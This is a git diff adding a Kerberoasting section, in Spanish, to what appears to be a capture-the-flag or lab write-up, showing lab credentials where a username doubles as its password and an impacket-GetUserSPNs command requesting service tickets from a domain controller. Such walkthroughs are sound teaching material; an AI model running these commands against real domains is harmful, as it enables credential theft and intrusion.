@@ -57,3 +57,11 @@ Encontramos un usuario que utiliza el mismo usuario como contraseña
 ybob317::ybob317
 ```
 
+# Explotación
+## Kerberoasting
+al tener unas credenciales validas así que podemos probar a hacer un ataque de `Kerberoasting` Se basa en listar todos los SPNs del dominio y poder solicitar los tickets de `TGS` para ellos.
+
+```shell
+impacket-GetUserSPNs -dc-ip 10.114.135.170 SOUPEDECODE.LOCAL/ybob317 -request
+```
+
